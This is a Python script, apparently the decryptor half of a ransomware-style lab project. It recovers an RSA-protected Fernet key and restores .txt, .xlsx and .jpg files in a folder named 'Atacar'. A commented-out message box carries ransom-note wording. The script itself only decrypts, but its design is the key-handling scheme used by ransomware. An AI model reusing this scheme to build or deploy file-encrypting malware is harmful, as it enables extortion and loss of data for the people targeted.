import os
import string
import rsa
import ctypes
import sys

from cryptography.fernet import Fernet

# File extensions to encrypt
def extensions(ext):
    return set(ext)

def find_files(files_location, encrypted_ext):
    file_paths = []
    for root, dirs, files in os.walk(files_location):
        for file in files:
            file_path, file_extension = os.path.splitext(root + '\\' + file)
            if file_extension in encrypted_ext:
                file_paths.append(root + '\\' + file)
    return file_paths


def decrypt_key():
    # Desencriptador de llaves
    try:
        with open('keys\\privKey.pem', mode='rb') as pk_file:
            keydata = pk_file.read()
            privKey = rsa.PrivateKey.load_pkcs1(keydata)
            f = open("keys\\files_key.key", 'rb+')
            fernet_key = f.read()
            f.close()
            decrypted_fernet_key = rsa.decrypt(fernet_key, privKey)
            f = open("keys\\files_key.key", 'wb')
            f.write(bytearray(decrypted_fernet_key))
            f.close()
            return decrypted_fernet_key

    except FileNotFoundError:
        #ctypes.windll.user32.MessageBoxW(0, "Para desencriptar los archivos, siga las instrucciones indicadas", "Error", 1)
        print("Error")
        sys.exit(1)


def decrypt_files(paths, file_key):
    # Desencriptador de archivos
    for file_path in paths:
        with open(file_path, 'rb') as f:
            archivo_encriptado = f.read()
            fernet = Fernet(file_key)
            decrypted = fernet.decrypt(archivo_encriptado)
            with open(file_path, 'wb') as f:
                f.write(decrypted)
            print("desencriptado:", file_path)


def main():
    encrypted_ext = extensions(('.txt', '.xlsx', '.jpg'))
    files_location = 'Atacar'
    paths = find_files(files_location, encrypted_ext)
    file_key = decrypt_key()
    decrypt_files(paths, file_key)

if __name__ == "__main__":
    main()